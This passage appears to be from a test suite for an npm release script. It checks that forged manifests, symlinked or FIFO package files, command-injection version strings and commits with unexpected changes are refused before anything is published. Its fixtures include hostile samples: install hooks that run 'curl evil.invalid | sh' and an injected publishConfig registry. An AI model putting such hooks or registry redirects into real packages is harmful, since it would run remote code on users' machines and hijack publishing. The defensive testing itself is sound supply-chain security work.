		writeFileSync(join(repo, "scripts/release-tarball.py"), readFileSync(TOOL, "utf8"));
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("shallow");
		expect(log()).toEqual([]);
	});

	it("refuses when the tag is not the checked-out commit", () => {
		releaseCommit("1.0.1");
		writeFileSync(join(repo, "README"), "y\n");
		git("commit", "-q", "-am", "later");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Dispatch the republish on the tag");
		expect(log()).toEqual([]);
	});

	it("refuses when there is no tag for the version", () => {
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Tag v1.0.0 does not exist");
	});

	it("refuses a 'release commit' that changes more than the version field", () => {
		writePackages("1.0.1", { scripts: { postinstall: "echo hi" } });
		git("add", ".");
		git("commit", "-q", "-m", "release: v1.0.1");
		git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain('beyond its "version" field');
		expect(log()).toEqual([]);
	});

	it("refuses a 'release commit' that touches another file", () => {
		writePackages("1.0.1");
		writeFileSync(join(repo, "README"), "y\n");
		git("add", ".");
		git("commit", "-q", "-m", "release: v1.0.1");
		git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
		const r = run(["gate"], { REPUBLISH: "true" });
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("changes 'README', which is not one of the six");
	});
});

describe("release.sh latest-flag", { timeout: 30_000 }, () => {
	const tags = (...names: string[]) => {
		for (const t of names) git("tag", "-a", t, "-m", t);
		git("push", "-q", "origin", "--tags");
	};

	it("an older version than the newest v* release is not Latest (an old republish)", () => {
		tags("v1.0.0", "v1.1.0", "v1.2.0");
		const r = run(["latest-flag", "1.1.0"]);
		expect(r.status).toBe(0);
		expect(r.out.trim()).toBe("false");
	});

	it("the newest version is Latest, its own tag included", () => {
		tags("v1.0.0", "v1.2.0");
		expect(run(["latest-flag", "1.2.0"]).out.trim()).toBe("true");
		expect(run(["latest-flag", "1.3.0"]).out.trim()).toBe("true");
	});

	it("compares semver, not text: 1.10.0 is newer than 1.9.0", () => {
		tags("v1.9.0", "v1.10.0");
		expect(run(["latest-flag", "1.10.0"]).out.trim()).toBe("true");
		expect(run(["latest-flag", "1.9.0"]).out.trim()).toBe("false");
	});

	it("a higher prerelease tag does not hold Latest, and a prerelease never takes it", () => {
		tags("v1.2.0", "v2.0.0-rc.1", "round6-backup", "wip-full");
		expect(run(["latest-flag", "1.3.0"]).out.trim()).toBe("true");
		expect(run(["latest-flag", "2.0.0-rc.2"]).out.trim()).toBe("false");
	});

	it("counts a newer tag that exists only on origin (fetched first)", () => {
		gitIn(join(dir, "origin.git"), "tag", "v9.0.0", "master");
		expect(run(["latest-flag", "1.3.0"]).out.trim()).toBe("false");
	});

	/** A v5.0.0 tag on a commit of a branch master never took, pushed to origin (the branch not). */
	const sideTag = () => {
		git("switch", "-q", "-c", "abandoned");
		writeFileSync(join(repo, "README"), "abandoned\n");
		git("commit", "-q", "-am", "abandoned direction");
		git("tag", "-a", "v5.0.0", "-m", "v5.0.0");
		git("push", "-q", "origin", "refs/tags/v5.0.0");
		git("switch", "-q", "master");
	};

	it("a v* tag that is not on master is not a release, and does not hold Latest", () => {
		tags("v4.1.0");
		sideTag();
		releaseCommit("4.2.0"); // its tag is not on master yet: the push comes later
		const out = packAll();
		const flag = run(["latest-flag", "4.2.0"]);
		expect(flag.status, flag.err).toBe(0);
		expect(flag.out.trim()).toBe("true");
		expect(run(["dist-tag", "4.2.0"]).out.trim()).toBe("latest");
		const dry = run(["publish", out, "HEAD", "--dry-run"]);
		expect(dry.status, dry.err).toBe(0);
		expect(log()).toEqual(published("4.2.0", DIRS, true, "latest"));
		// Control: once master takes that commit, v5.0.0 is a release, and 4.2.0 is older.
		gitIn(join(dir, "origin.git"), "update-ref", "refs/heads/master", "refs/tags/v5.0.0^{commit}");
		expect(run(["latest-flag", "4.2.0"]).out.trim()).toBe("false");
	});

	it("a higher v* tag on master still makes an older version backfill", () => {
		tags("v4.1.0", "v5.0.0");
		releaseCommit("4.2.0");
		expect(run(["latest-flag", "4.2.0"]).out.trim()).toBe("false");
		expect(run(["dist-tag", "4.2.0"]).out.trim()).toBe("backfill");
	});

	it("refuses, before any npm call, when master cannot be fetched", () => {
		tags("v4.1.0");
		sideTag();
		const out = packAll();
		gitIn(dir, "init", "-q", "--bare", "-b", "master", "no-master.git");
		git("remote", "set-url", "origin", join(dir, "no-master.git"));
		rmSync(join(dir, "calls"), { force: true });
		for (const args of [
			["latest-flag", "1.0.0"],
			["dist-tag", "1.0.0"],
			["publish", out, "HEAD", "--dry-run"],
		]) {
			const r = run(args);
			expect(r.status, args.join(" ")).not.toBe(0);
			expect(r.err).toContain(
				"Could not fetch master from origin, so cannot tell whether v1.0.0 is the newest release",
			);
			expect(r.out.trim()).not.toMatch(/^(true|false|latest|backfill)$/);
		}
		expect(log()).toEqual([]);
		expect(existsSync(join(dir, "calls"))).toBe(false);
	});

	it("refuses in a shallow history, which cannot show what is on master", () => {
		tags("v4.1.0");
		const shallow = join(dir, "shallow-latest");
		gitIn(dir, "clone", "-q", "--depth", "1", `file://${join(dir, "origin.git")}`, shallow);
		repo = shallow;
		mkdirSync(join(repo, "scripts"), { recursive: true });
		writeFileSync(join(repo, "scripts/release.sh"), readFileSync(SCRIPT, "utf8"));
		const r = run(["latest-flag", "4.2.0"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain(
			"This history is shallow, so cannot tell whether v4.2.0 is the newest release",
		);
		expect(r.out).toBe("");
	});

	it("fails when it cannot fetch the tags", () => {
		git("remote", "set-url", "origin", join(dir, "nowhere.git"));
		const r = run(["latest-flag", "1.3.0"]);
		expect(r.status).not.toBe(0);
		expect(r.err).toContain("Could not fetch tags");
	});
});

// ── Everything from the build job is untrusted data ──

describe("release.sh treats build output as data", { timeout: 30_000 }, () => {
	const marker = () => join(dir, "EXECUTED");
	const evil = (file: string) =>
		writeFileSync(
			file,
			`require("node:fs").writeFileSync(${JSON.stringify(marker())}, "ran");\nmodule.exports = { name: "usertrust", version: "1.0.0" };\n`,
		);
	const manifestFor = (d: string, version: string, extra: Record<string, unknown> = {}) =>
		`${JSON.stringify({ name: NAMES[d], version, license: "Apache-2.0", ...extra }, null, "\t")}\n`;

	describe("a manifest in the working tree is read without following or executing it", () => {
		it("refuses a package.json that is a symlink to a .js file, and never runs it", () => {
			evil(join(repo, "evil.js"));
			rmSync(join(repo, "packages/core/package.json"));
			symlinkSync("../../evil.js", join(repo, "packages/core/package.json"));
			const r = run(["version"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("cannot be opened as a regular file");
			expect(existsSync(marker())).toBe(false);
		});

		it("refuses a package.json that is a symlink to a valid manifest elsewhere", () => {
			writeFileSync(join(repo, "elsewhere.json"), manifestFor("core", "1.0.0"));
			rmSync(join(repo, "packages/core/package.json"));
			symlinkSync("../../elsewhere.json", join(repo, "packages/core/package.json"));
			const r = run(["version"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("cannot be opened as a regular file");
		});

		it("refuses a package.json that is a FIFO, without waiting on it", () => {
			rmSync(join(repo, "packages/core/package.json"));
			expect(spawnSync("mkfifo", [join(repo, "packages/core/package.json")]).status).toBe(0);
			const r = run(["version"]);
			expect(r.status).not.toBe(0);
			expect(r.status).not.toBeNull();
			expect(r.err).toContain("is not a regular file");
		});
	});

	describe("a manifest in a commit is read as a git blob of mode 100644 only", () => {
		const commitWith = (link: (path: string) => void) => {
			writePackages("1.0.1");
			link(join(repo, "packages/core/package.json"));
			git("add", "-A");
			git("commit", "-q", "-m", "release: v1.0.1");
			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
		};

		it("refuses a committed package.json that is a symlink to a .cjs file, and never runs it", () => {
			evil(join(repo, "evil.cjs"));
			commitWith((p) => {
				rmSync(p);
				symlinkSync("../../evil.cjs", p);
			});
			for (const args of [["release-parent"], ["version-at", "HEAD"]]) {
				const r = run(args);
				expect(r.status, args.join(" ")).not.toBe(0);
				expect(r.err).toContain("is not a regular file (tree entry");
			}
			expect(existsSync(marker())).toBe(false);
		});

		it("refuses a committed package.json that is executable (100755)", () => {
			commitWith((p) => chmodSync(p, 0o755));
			const r = run(["release-parent"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("is not a regular file (tree entry");
		});
	});

	describe("the build job's bundle", () => {
		/** The build job's work, in a clone: bump, commit, tag, bundle on top of the base. */
		const bundleFrom = (
			arrange: (clone: string) => void = () => {},
			commitArgs: string[] = ["-s", "-m", "release: v1.0.1"],
		) => {
			const clone = join(dir, "build");
			gitIn(dir, "clone", "-q", repo, clone);
			const base = gitIn(clone, "rev-parse", "HEAD");
			const saved = repo;
			repo = clone;
			writePackages("1.0.1");
			arrange(clone);
			git("add", "-A");
			git("commit", "-q", ...commitArgs);
			git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
			const bundle = join(dir, "release.bundle");
			git("bundle", "create", "-q", bundle, "refs/tags/v1.0.1", `^${base}`);
			repo = saved;
			return bundle;
		};

		it("a version bump on this run's commit is accepted, and the commit printed", () => {
			const bundle = bundleFrom();
			const r = run(["verify-release", bundle, "1.0.1"]);
			expect(r.status).toBe(0);
			expect(r.out.trim()).toBe(git("rev-parse", "refs/tags/v1.0.1^{commit}"));
		});

		for (const bad of ["1.0.1;touch x", "../../x", "1.0", "1.0.1-rc.1", "v1.0.1", ""]) {
			it(`refuses the reported version ${JSON.stringify(bad)} before using it`, () => {
				const bundle = bundleFrom();
				const r = run(["verify-release", bundle, bad]);
				expect(r.status).not.toBe(0);
				expect(r.err).toContain("is not major.minor.patch");
			});
		}

		it("refuses a release commit that does not sit on this run's commit", () => {
			const bundle = bundleFrom();
			writeFileSync(join(repo, "README"), "moved on\n");
			git("commit", "-q", "-am", "master moved");
			const r = run(["verify-release", bundle, "1.0.1"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("sits on");
		});

		const signoff = "Signed-off-by: t <t@example.com>";
		for (const [what, args] of [
			["no DCO sign-off", ["-m", "release: v1.0.1"]],
			["a sign-off by someone else", ["-m", "release: v1.0.1\n\nSigned-off-by: x <x@example.com>"]],
			[
				"another trailer as well",
				["-m", `release: v1.0.1\n\n${signoff}\nCo-authored-by: x <x@example.com>`],
			],
			["a body as well", ["-m", `release: v1.0.1\n\nmore text\n\n${signoff}`]],
			["another subject", ["-s", "-m", "release: v1.0.1 (and more)"]],
		] as const) {
			it(`refuses a release commit with ${what}`, () => {
				const bundle = bundleFrom(() => {}, [...args]);
				const r = run(["verify-release", bundle, "1.0.1"]);
				expect(r.status).not.toBe(0);
				expect(r.err).toContain("committer's DCO sign-off");
			});
		}

		it("refuses a release commit that adds publishConfig", () => {
			const bundle = bundleFrom((clone) =>
				writeFileSync(
					join(clone, "packages/server/package.json"),
					manifestFor("server", "1.0.1", { publishConfig: { registry: "https://evil.invalid/" } }),
				),
			);
			const r = run(["verify-release", bundle, "1.0.1"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("publishConfig");
		});
	});

	describe("the build's root files are discarded: what is published carries the commit's", () => {
		const forge = (out: string, d: string, manifest: Record<string, unknown>) =>
			writeFileSync(
				join(out, `${NAMES[d]}-1.0.0.tgz`),
				gz(
					archive(
						member("package/package.json", JSON.stringify(manifest)),
						member("package/README.md", "a README the build wrote\n"),
						member("package/dist/index.js", "export {};\n"),
					),
				),
			);
		const base = (d: string) => ({ name: NAMES[d], version: "1.0.0", license: "Apache-2.0" });
		/** The package/package.json npm was handed for <d>, from the fake npm's copy. */
		const handed = (d: string) =>
			readTar(readFileSync(join(dir, `log.${NAMES[d]}-1.0.0.tgz`)))
				.find((e) => e.name === "package/package.json")
				?.data.toString("utf8");

		const cases: [string, string, Record<string, unknown>][] = [
			[
				"an injected publishConfig.registry",
				"server",
				{ ...base("server"), publishConfig: { registry: "https://evil.invalid/" } },
			],
			[
				"an added prepublishOnly script",
				"verify",
				{ ...base("verify"), scripts: { prepublishOnly: "curl evil.invalid | sh" } },
			],
			[
				"an added postpublish script",
				"ui",
				{ ...base("ui"), scripts: { postpublish: "curl evil.invalid | sh" } },
			],
			["a changed name", "core", { ...base("core"), name: "@evil/usertrust" }],
			["another version", "acs-adapter", { ...base("acs-adapter"), version: "1.0.9" }],
		];
		for (const [what, d, manifest] of cases) {
			it(`a build manifest with ${what} never reaches npm`, () => {
				const out = packAll();
				forge(out, d, manifest);
				const r = run(["publish", out, "HEAD", "--dry-run"]);
				expect(r.status, r.err).toBe(0);
				expect(log()).toEqual(published("1.0.0", DIRS, true));
				const commit = git("show", `HEAD:packages/${d}/package.json`);
				expect(handed(d)?.trimEnd()).toBe(commit);
				const entries = readTar(readFileSync(join(dir, `log.${NAMES[d]}-1.0.0.tgz`)));
				expect(entries.map((e) => e.name)).toEqual([
					"package/dist/index.js",
					"package/package.json",
				]);
			});
		}

		it("refuses a tarball that is a symlink", () => {
			const out = packAll();
			const real = join(out, "usertrust-ui-1.0.0.tgz");
			const moved = join(dir, "moved.tgz");
			writeFileSync(moved, readFileSync(real));
			rmSync(real);
			symlinkSync(moved, real);
			const r = run(["publish", out, "HEAD", "--dry-run"]);
			expect(r.status).not.toBe(0);
			expect(r.err).toContain("not a regular file");
			expect(log()).toEqual([]);
		});
	});

	describe("a changed path is a literal string, never a pattern", () => {
		for (const weird of ["[c]ore", "co*e", "co?e", "core x", "core "]) {
			it(`refuses a release commit that also changes packages/${weird}/package.json`, () => {
				writePackages("1.0.1");
				mkdirSync(join(repo, "packages", weird), { recursive: true });
				writeFileSync(join(repo, "packages", weird, "package.json"), manifestFor("core", "1.0.1"));
				git("add", "-A");
				git("commit", "-q", "-m", "release: v1.0.1");
				git("tag", "-a", "v1.0.1", "-m", "v1.0.1");
				const r = run(["release-parent"]);
				expect(r.status).not.toBe(0);
				expect(r.err).toContain(
					`changes 'packages/${weird}/package.json', which is not one of the six`,
				);
			});
		}
	});
});

// ── The upload path: what npm is handed is exactly what was assembled ──

describe("npm publish is handed exactly the assembled tarball", { timeout: 120_000 }, () => {
	/** Packages as they ship: dist/, README.md, LICENSE and NOTICE in each, all committed. */
	const realistic = () => {
		writePackages("1.0.0", { files: ["dist", "LICENSE", "NOTICE"] });
		for (const d of DIRS) {
			const p = join(repo, "packages", d);
			writeFileSync(join(p, "README.md"), `# ${NAMES[d]}\n`);
			writeFileSync(join(p, "LICENSE"), "Apache License 2.0\n");
			writeFileSync(join(p, "NOTICE"), "NOTICE\n");
			mkdirSync(join(p, "dist", "cli"), { recursive: true });
			writeFileSync(join(p, "dist", "index.js"), `export const name = "${NAMES[d]}";\n`);
			writeFileSync(join(p, "dist", "cli", "main.js"), "#!/usr/bin/env node\n");
		}
		git("add", "-A");
		git("commit", "-q", "-m", "realistic packages");
	};

	/** The tarball an independent run of the assembler writes for <d> from the build's tarball. */
	const assembleAlone = (out: string, d: string): Buffer => {
		const roots = mkdtempSync(join(dir, `roots-${d}-`));
		const args: string[] = [];
		for (const name of ["package.json", "README.md", "LICENSE", "NOTICE"]) {
			writeFileSync(join(roots, name), `${git("show", `HEAD:packages/${d}/${name}`)}\n`);
			args.push("--root", `${name}=${join(roots, name)}`);
		}
		const target = join(roots, "out.tgz");
		const r = spawnSync(
			"python3",
			[
				"-I",
				TOOL,
				"assemble",
				"--input",
				join(out, `${NAMES[d]}-1.0.0.tgz`),
				"--output",
				target,
				"--mtime",
				git("show", "-s", "--format=%ct", "HEAD"),
				...args,
			],
			{ encoding: "utf8" },
		);
		expect(r.status, r.stderr).toBe(0);
		return readFileSync(target);
	};

	it("the exact command, for every package, with the assembled file as its only tarball", () => {
		realistic();
		const out = packAll();
		const r = run(["publish", out, "HEAD"]);
		expect(r.status, r.err).toBe(0);
		expect(log()).toEqual(published("1.0.0", DIRS, false));
		for (const d of DIRS) {
			const handed = readFileSync(join(dir, `log.${NAMES[d]}-1.0.0.tgz`));
			expect(handed.equals(assembleAlone(out, d)), NAMES[d]).toBe(true);
			// And it is not the build's tarball.
			expect(handed.equals(readFileSync(join(out, `${NAMES[d]}-1.0.0.tgz`)))).toBe(false);
			expect(readTar(handed).map((e) => e.name)).toEqual([
				"package/LICENSE",
				"package/NOTICE",
				"package/README.md",
				"package/dist/cli/main.js",
				"package/dist/index.js",
				"package/package.json",
			]);
		}
	});

	it("npm's reader takes the commit's manifest from those bytes, and digests exactly them", async () => {
		realistic();
		const out = packAll();
		expect(run(["publish", out, "HEAD", "--dry-run"]).status).toBe(0);
		const npmRequire = createRequire(
			join(execFileSync("npm", ["root", "-g"], { encoding: "utf8" }).trim(), "npm", "package.json"),
		);
		const pacote = npmRequire("pacote") as {
			manifest: (
				spec: string,
				opts: { cache: string },
			) => Promise<{ name: string; version: string; _integrity: string }>;
		};
		const file = join(dir, "log.usertrust-server-1.0.0.tgz");
		const m = await pacote.manifest(`file:${file}`, { cache: join(dir, "pacote-cache") });
		const sha512 = createHash("sha512").update(readFileSync(file)).digest("base64");
		expect([m.name, m.version, m._integrity]).toEqual([
			"usertrust-server",
			"1.0.0",
			`sha512-${sha512}`,
		]);
		expect(readdirSync(dir).filter((f) => f.startsWith("log.") && f.endsWith(".tgz")).length).toBe(
			6,
		);
	});
});
